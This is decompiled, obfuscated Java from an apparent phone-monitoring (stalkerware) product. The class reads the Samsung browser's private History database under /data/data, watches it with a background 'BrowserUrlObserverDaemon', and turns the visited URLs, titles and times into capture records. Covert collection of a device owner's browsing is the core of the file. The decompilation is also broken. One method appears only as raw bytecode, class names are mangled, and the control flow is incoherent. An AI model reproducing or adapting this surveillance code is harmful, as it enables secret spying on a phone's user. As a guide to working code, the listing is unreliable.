package com.vvt.capture.browserurl.a;

import com.vvt.ak.a;
import com.vvt.base.capture.e;
import com.vvt.base.capture.i;
import com.vvt.capture.browserurl.BrowserUrlData;
import com.vvt.io.FxFileObserver;
import com.vvt.io.FxFileObserver.ObservingMode;
import com.vvt.io.g;
import java.io.File;

public class c
  implements e
{
  private static final boolean a = a.a;
  private static final boolean b = a.b;
  private static final boolean c = a.b;
  private i d;
  private FxFileObserver e;
  private g f;
  private BrowserUrlData g;
  private Thread h = null;
  private String i;
  
  public c(String paramString)
  {
    this.i = paramString;
  }
  
  private String f()
  {
    String str = null;
    int j = b.d();
    if (j != 0) {
      str = "/data/data/com.sec.android.app.sbrowser/app_sbrowser/Default/History";
    }
    label62:
    for (;;)
    {
      return str;
      File[] arrayOfFile = b.a;
      int m = arrayOfFile.length;
      j = 0;
      for (;;)
      {
        if (j >= m) {
          break label62;
        }
        File localFile = arrayOfFile[j];
        boolean bool = localFile.exists();
        if (bool)
        {
          str = localFile.getAbsolutePath();
          break;
        }
        int k;
        j += 1;
      }
    }
  }
  
  private g g()
  {
    d locald = new com/vvt/capture/browserurl/a/d;
    locald.<init>(this);
    return locald;
  }
  
  private void h()
  {
    boolean bool1 = false;
    float f1 = 0.0F;
    boolean bool2 = true;
    float f2 = Float.MIN_VALUE;
    boolean bool3 = a;
    if (bool3) {}
    BrowserUrlData localBrowserUrlData1 = i();
    if (localBrowserUrlData1 != null)
    {
      localObject = localBrowserUrlData1.c();
      if (localObject != null) {
        break label44;
      }
    }
    for (;;)
    {
      return;
      label44:
      localObject = this.g;
      if (localObject != null) {
        break;
      }
      this.g = localBrowserUrlData1;
      if (bool2)
      {
        bool3 = b;
        if (bool3) {}
        localObject = this.d;
        ((i)localObject).a();
      }
      bool3 = a;
      if (!bool3) {}
    }
    long l1 = localBrowserUrlData1.a();
    Object localObject = this.g;
    long l2 = ((BrowserUrlData)localObject).a();
    bool3 = l1 < l2;
    if (!bool3) {
      bool3 = bool2;
    }
    for (;;)
    {
      boolean bool4 = a;
      if (bool4) {}
      l1 = localBrowserUrlData1.d();
      BrowserUrlData localBrowserUrlData2 = this.g;
      l2 = localBrowserUrlData2.d();
      l1 -= l2;
      boolean bool5 = a;
      if ((!bool5) || (bool3))
      {
        l2 = 30000L;
        bool3 = l1 < l2;
        if (!bool3) {}
      }
      else
      {
        bool1 = bool2;
        f1 = f2;
      }
      bool2 = bool1;
      f2 = f1;
      break;
      bool3 = false;
      localObject = null;
    }
  }
  
  /* Error */
  private BrowserUrlData i()
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_1
    //   2: getstatic 27	com/vvt/capture/browserurl/a/MyUncaughtExceptionHandler:a	Z
    //   5: istore_2
    //   6: iload_2
    //   7: ifeq +3 -> 10
    //   10: ldc 93
    //   12: astore_3
    //   13: ldc 93
    //   15: astore 4
    //   17: ldc 95
    //   19: astore 5
    //   21: ldc 97
    //   23: astore 6
    //   25: ldc 99
    //   27: astore 7
    //   29: ldc 101
    //   31: astore 8
    //   33: invokestatic 47	com/vvt/capture/browserurl/a/removeFromPath:d	()Z
    //   36: istore_2
    //   37: iload_2
    //   38: ifeq +413 -> 451
    //   41: getstatic 27	com/vvt/capture/browserurl/a/MyUncaughtExceptionHandler:a	Z
    //   44: istore_2
    //   45: iload_2
    //   46: ifeq +3 -> 49
    //   49: ldc 49
    //   51: astore_3
    //   52: aload_0
    //   53: getfield 40	com/vvt/capture/browserurl/a/MyUncaughtExceptionHandler:i	Ljava/lang/String;
    //   56: astore 6
    //   58: aload_3
    //   59: aload 6
    //   61: invokestatic 106	com/vvt/capture/browserurl/a/a:a	(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   64: astore 4
    //   66: aload 4
    //   68: invokestatic 109	com/vvt/capture/browserurl/a/removeFromPath:a	(Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   71: astore_3
    //   72: ldc 111
    //   74: astore 9
    //   76: ldc 113
    //   78: astore 10
    //   80: aload 4
    //   82: astore 11
    //   84: ldc 115
    //   86: astore 5
    //   88: aload_3
    //   89: astore 6
    //   91: aload 9
    //   93: astore_3
    //   94: aload 6
    //   96: ifnull +551 -> 647
    //   99: ldc 117
    //   101: astore 4
    //   103: iconst_2
    //   104: istore 12
    //   106: iload 12
    //   108: anewarray 4	java/lang/Object
    //   111: astore 9
    //   113: aload 9
    //   115: iconst_0
    //   116: aload_3
    //   117: aastore
    //   118: iconst_1
    //   119: istore_2
    //   120: aload 9
    //   122: iload_2
    //   123: aload 5
    //   125: aastore
    //   126: aload 4
    //   128: aload 9
    //   130: invokestatic 124	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   133: astore_3
    //   134: iconst_0
    //   135: istore 13
    //   137: aconst_null
    //   138: astore 4
    //   140: aload 6
    //   142: aload_3
    //   143: aconst_null
    //   144: invokevirtual 130	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   147: astore_3
    //   148: aload_3
    //   149: invokeinterface 135 1 0
    //   154: istore 13
    //   156: iload 13
    //   158: ifeq +258 -> 416
    //   161: aload_3
    //   162: aload 7
    //   164: invokeinterface 139 2 0
    //   169: istore 13
    //   171: aload_3
    //   172: iload 13
    //   174: invokeinterface 143 2 0
    //   179: astore 7
    //   181: aload 7
    //   183: ifnull +233 -> 416
    //   186: aload 7
    //   188: invokevirtual 146	java/lang/String:trim	()Ljava/lang/String;
    //   191: astore 4
    //   193: aload 4
    //   195: invokevirtual 150	java/lang/String:length	()I
    //   198: istore 13
    //   200: iload 13
    //   202: ifeq +214 -> 416
    //   205: ldc -104
    //   207: astore 4
    //   209: aload 7
    //   211: aload 4
    //   213: invokevirtual 156	java/lang/String:equalsIgnoreCase	(Ljava/lang/String;)Z
    //   216: istore 13
    //   218: iload 13
    //   220: ifne +196 -> 416
    //   223: aload_3
    //   224: aload 5
    //   226: invokeinterface 139 2 0
    //   231: istore 14
    //   233: aload_3
    //   234: iload 14
    //   236: invokeinterface 160 2 0
    //   241: lstore 15
    //   243: ldc2_w 161
    //   246: lstore 17
    //   248: lload 15
    //   250: lload 17
    //   252: lcmp
    //   253: istore 12
    //   255: iload 12
    //   257: ifle +383 -> 640
    //   260: invokestatic 169	java/lang/System:currentTimeMillis	()J
    //   263: lstore 15
    //   265: lload 15
    //   267: lstore 19
    //   269: aload_3
    //   270: aload 10
    //   272: invokeinterface 139 2 0
    //   277: istore 14
    //   279: aload_3
    //   280: iload 14
    //   282: invokeinterface 160 2 0
    //   287: lstore 17
    //   289: aload_3
    //   290: aload 8
    //   292: invokeinterface 139 2 0
    //   297: istore 14
    //   299: aload_3
    //   300: iload 14
    //   302: invokeinterface 143 2 0
    //   307: astore 10
    //   309: new 171	java/text/SimpleDateFormat
    //   312: astore 5
    //   314: ldc -83
    //   316: astore 8
    //   318: aload 5
    //   320: aload 8
    //   322: invokespecial 176	java/text/SimpleDateFormat:<init>	(Ljava/lang/String;)V
    //   325: new 178	java/sql/Date
    //   328: astore 8
    //   330: invokestatic 169	java/lang/System:currentTimeMillis	()J
    //   333: lstore 21
    //   335: aload 8
    //   337: lload 21
    //   339: invokespecial 181	java/sql/Date:<init>	(J)V
    //   342: aload 5
    //   344: aload 8
    //   346: invokevirtual 184	java/text/SimpleDateFormat:format	(Ljava/util/Date;)Ljava/lang/String;
    //   349: astore 8
    //   351: new 72	com/vvt/capture/browserurl/BrowserUrlData
    //   354: astore 5
    //   356: aload 5
    //   358: invokespecial 185	com/vvt/capture/browserurl/BrowserUrlData:<init>	()V
    //   361: aload 5
    //   363: lload 17
    //   365: invokevirtual 187	com/vvt/capture/browserurl/BrowserUrlData:a	(J)V
    //   368: getstatic 193	com/vvt/capture/browserurl/BrowserUrlData$UrlType:HISTORY	Lcom/vvt/capture/browserurl/BrowserUrlData$UrlType;
    //   371: astore_1
    //   372: aload 5
    //   374: aload_1
    //   375: invokevirtual 196	com/vvt/capture/browserurl/BrowserUrlData:a	(Lcom/vvt/capture/browserurl/BrowserUrlData$UrlType;)V
    //   378: aload 5
    //   380: aload 10
    //   382: invokevirtual 198	com/vvt/capture/browserurl/BrowserUrlData:a	(Ljava/lang/String;)V
    //   385: aload 5
    //   387: aload 7
    //   389: invokevirtual 200	com/vvt/capture/browserurl/BrowserUrlData:removeFromPath	(Ljava/lang/String;)V
    //   392: aload 5
    //   394: lload 19
    //   396: invokevirtual 202	com/vvt/capture/browserurl/BrowserUrlData:removeFromPath	(J)V
    //   399: aload 5
    //   401: aload 8
    //   403: invokevirtual 204	com/vvt/capture/browserurl/BrowserUrlData:MyUncaughtExceptionHandler	(Ljava/lang/String;)V
    //   406: aload 5
    //   408: lload 19
    //   410: invokevirtual 206	com/vvt/capture/browserurl/BrowserUrlData:MyUncaughtExceptionHandler	(J)V
    //   413: aload 5
    //   415: astore_1
    //   416: aload 11
    //   418: invokestatic 207	com/vvt/capture/browserurl/a/a:a	(Ljava/lang/String;)V
    //   421: aload_3
    //   422: ifnull +9 -> 431
    //   425: aload_3
    //   426: invokeinterface 210 1 0
    //   431: aload 6
    //   433: ifnull +8 -> 441
    //   436: aload 6
    //   438: invokevirtual 211	android/database/sqlite/SQLiteDatabase:close	()V
    //   441: getstatic 27	com/vvt/capture/browserurl/a/MyUncaughtExceptionHandler:a	Z
    //   444: istore_2
    //   445: iload_2
    //   446: ifeq +3 -> 449
    //   449: aload_1
    //   450: areturn
    //   451: invokestatic 213	com/vvt/capture/browserurl/a/removeFromPath:MyUncaughtExceptionHandler	()Z
    //   454: istore_2
    //   455: iload_2
    //   456: ifeq +40 -> 496
    //   459: getstatic 27	com/vvt/capture/browserurl/a/MyUncaughtExceptionHandler:a	Z
    //   462: istore_2
    //   463: iload_2
    //   464: ifeq +3 -> 467
    //   467: invokestatic 216	com/vvt/capture/browserurl/a/removeFromPath:a	()Landroid/database/sqlite/SQLiteDatabase;
    //   470: astore_3
    //   471: ldc -38
    //   473: astore 9
    //   475: aload 5
    //   477: astore 10
    //   479: aload 4
    //   481: astore 11
    //   483: aload 6
    //   485: astore 5
    //   487: aload_3
    //   488: astore 6
    //   490: aload 9
    //   492: astore_3
    //   493: goto -399 -> 94
    //   496: getstatic 27	com/vvt/capture/browserurl/a/MyUncaughtExceptionHandler:a	Z
    //   499: istore_2
    //   500: iload_2
    //   501: ifeq +3 -> 504
    //   504: invokestatic 216	com/vvt/capture/browserurl/a/removeFromPath:a	()Landroid/database/sqlite/SQLiteDatabase;
    //   507: astore_3
    //   508: ldc -36
    //   510: astore 9
    //   512: aload 5
    //   514: astore 10
    //   516: aload 4
    //   518: astore 11
    //   520: aload 6
    //   522: astore 5
    //   524: aload_3
    //   525: astore 6
    //   527: aload 9
    //   529: astore_3
    //   530: goto -436 -> 94
    //   533: astore_3
    //   534: iconst_0
    //   535: istore_2
    //   536: aconst_null
    //   537: astore_3
    //   538: aconst_null
    //   539: astore 6
    //   541: getstatic 32	com/vvt/capture/browserurl/a/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	Z
    //   544: istore 14
    //   546: iload 14
    //   548: ifeq +3 -> 551
    //   551: aload_3
    //   552: ifnull +9 -> 561
    //   555: aload_3
    //   556: invokeinterface 210 1 0
    //   561: aload 6
    //   563: ifnull -122 -> 441
    //   566: goto -130 -> 436
    //   569: astore_3
    //   570: aconst_null
    //   571: astore 6
    //   573: aconst_null
    //   574: astore 23
    //   576: aload_3
    //   577: astore_1
    //   578: iconst_0
    //   579: istore_2
    //   580: aconst_null
    //   581: astore_3
    //   582: aload_3
    //   583: ifnull +9 -> 592
    //   586: aload_3
    //   587: invokeinterface 210 1 0
    //   592: aload 6
    //   594: ifnull +8 -> 602
    //   597: aload 6
    //   599: invokevirtual 211	android/database/sqlite/SQLiteDatabase:close	()V
    //   602: aload_1
    //   603: athrow
    //   604: astore 23
    //   606: iconst_0
    //   607: istore_2
    //   608: aconst_null
    //   609: astore_3
    //   610: aload 23
    //   612: astore_1
    //   613: goto -31 -> 582
    //   616: astore_1
    //   617: goto -35 -> 582
    //   620: astore_3
    //   621: iconst_0
    //   622: istore_2
    //   623: aconst_null
    //   624: astore_3
    //   625: goto -84 -> 541
    //   628: astore 5
    //   630: goto -89 -> 541
    //   633: astore_1
    //   634: aload 5
    //   636: astore_1
    //   637: goto -96 -> 541
    //   640: lload 15
    //   642: lstore 19
    //   644: goto -375 -> 269
    //   647: iconst_0
    //   648: istore_2
    //   649: aconst_null
    //   650: astore_3
    //   651: goto -235 -> 416
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	654	0	this	MyUncaughtExceptionHandler
    //   1	612	1	localObject1	Object
    //   616	1	1	localObject2	Object
    //   633	1	1	localException1	Exception
    //   636	1	1	localObject3	Object
    //   5	644	2	bool1	boolean
    //   12	518	3	localObject4	Object
    //   533	1	3	localException2	Exception
    //   537	19	3	localObject5	Object
    //   569	8	3	localObject6	Object
    //   581	29	3	localObject7	Object
    //   620	1	3	localException3	Exception
    //   624	27	3	localObject8	Object
    //   15	502	4	str1	String
    //   19	504	5	localObject9	Object
    //   628	7	5	localException4	Exception
    //   23	575	6	localObject10	Object
    //   27	361	7	str2	String
    //   31	371	8	localObject11	Object
    //   74	454	9	localObject12	Object
    //   78	437	10	localObject13	Object
    //   82	437	11	str3	String
    //   104	3	12	j	int
    //   253	3	12	bool2	boolean
    //   135	22	13	bool3	boolean
    //   169	32	13	k	int
    //   216	3	13	bool4	boolean
    //   231	70	14	m	int
    //   544	3	14	bool5	boolean
    //   241	400	15	l1	long
    //   246	118	17	l2	long
    //   267	376	19	l3	long
    //   333	5	21	l4	long
    //   574	1	23	localObject14	Object
    //   604	7	23	localObject15	Object
    // Exception table:
    //   from	to	target	type
    //   33	36	533	java/lang/Exception
    //   41	44	533	java/lang/Exception
    //   52	56	533	java/lang/Exception
    //   59	64	533	java/lang/Exception
    //   66	71	533	java/lang/Exception
    //   451	454	533	java/lang/Exception
    //   459	462	533	java/lang/Exception
    //   467	470	533	java/lang/Exception
    //   496	499	533	java/lang/Exception
    //   504	507	533	java/lang/Exception
    //   33	36	569	finally
    //   41	44	569	finally
    //   52	56	569	finally
    //   59	64	569	finally
    //   66	71	569	finally
    //   451	454	569	finally
    //   459	462	569	finally
    //   467	470	569	finally
    //   496	499	569	finally
    //   504	507	569	finally
    //   106	111	604	finally
    //   116	118	604	finally
    //   123	126	604	finally
    //   128	133	604	finally
    //   143	147	604	finally
    //   148	154	616	finally
    //   162	169	616	finally
    //   172	179	616	finally
    //   186	191	616	finally
    //   193	198	616	finally
    //   211	216	616	finally
    //   224	231	616	finally
    //   234	241	616	finally
    //   260	263	616	finally
    //   270	277	616	finally
    //   280	287	616	finally
    //   290	297	616	finally
    //   300	307	616	finally
    //   309	312	616	finally
    //   320	325	616	finally
    //   325	328	616	finally
    //   330	333	616	finally
    //   337	342	616	finally
    //   344	349	616	finally
    //   351	354	616	finally
    //   356	361	616	finally
    //   363	368	616	finally
    //   368	371	616	finally
    //   374	378	616	finally
    //   380	385	616	finally
    //   387	392	616	finally
    //   394	399	616	finally
    //   401	406	616	finally
    //   408	413	616	finally
    //   416	421	616	finally
    //   541	544	616	finally
    //   106	111	620	java/lang/Exception
    //   116	118	620	java/lang/Exception
    //   123	126	620	java/lang/Exception
    //   128	133	620	java/lang/Exception
    //   143	147	620	java/lang/Exception
    //   148	154	628	java/lang/Exception
    //   162	169	628	java/lang/Exception
    //   172	179	628	java/lang/Exception
    //   186	191	628	java/lang/Exception
    //   193	198	628	java/lang/Exception
    //   211	216	628	java/lang/Exception
    //   224	231	628	java/lang/Exception
    //   234	241	628	java/lang/Exception
    //   260	263	628	java/lang/Exception
    //   270	277	628	java/lang/Exception
    //   280	287	628	java/lang/Exception
    //   290	297	628	java/lang/Exception
    //   300	307	628	java/lang/Exception
    //   309	312	628	java/lang/Exception
    //   320	325	628	java/lang/Exception
    //   325	328	628	java/lang/Exception
    //   330	333	628	java/lang/Exception
    //   337	342	628	java/lang/Exception
    //   344	349	628	java/lang/Exception
    //   351	354	628	java/lang/Exception
    //   356	361	628	java/lang/Exception
    //   416	421	628	java/lang/Exception
    //   363	368	633	java/lang/Exception
    //   368	371	633	java/lang/Exception
    //   374	378	633	java/lang/Exception
    //   380	385	633	java/lang/Exception
    //   387	392	633	java/lang/Exception
    //   394	399	633	java/lang/Exception
    //   401	406	633	java/lang/Exception
    //   408	413	633	java/lang/Exception
  }
  
  public FxFileObserver a()
  {
    Object localObject = f();
    FxFileObserver localFxFileObserver;
    if (localObject != null)
    {
      localFxFileObserver = new com/vvt/io/FxFileObserver;
      String str = "BrowserUrlObserverDaemon";
      g localg = this.f;
      localFxFileObserver.<init>(str, (String)localObject, localg);
      localObject = FxFileObserver.ObservingMode.MODE_MINIMUM_NOTIFY;
      localFxFileObserver.a((FxFileObserver.ObservingMode)localObject);
      int j = 2;
      localFxFileObserver.a(j);
    }
    for (;;)
    {
      return localFxFileObserver;
      localFxFileObserver = null;
    }
  }
  
  public void a(i parami)
  {
    boolean bool = a;
    if (bool) {}
    Object localObject = this.e;
    if (localObject == null)
    {
      this.d = parami;
      localObject = g();
      this.f = ((g)localObject);
      localObject = a();
      this.e = ((FxFileObserver)localObject);
      localObject = this.e;
      if (localObject == null) {
        break label77;
      }
      localObject = this.e;
      ((FxFileObserver)localObject).a();
    }
    for (;;)
    {
      bool = b;
      if (bool) {}
      bool = a;
      if (bool) {}
      return;
      label77:
      bool = c;
      if (!bool) {}
    }
  }
  
  public void b()
  {
    boolean bool = a;
    if (bool) {}
    FxFileObserver localFxFileObserver = this.e;
    if (localFxFileObserver != null)
    {
      bool = b;
      if (bool) {}
      localFxFileObserver = this.e;
      localFxFileObserver.b();
    }
    this.e = null;
    this.f = null;
    bool = a;
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/browserurl/a/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */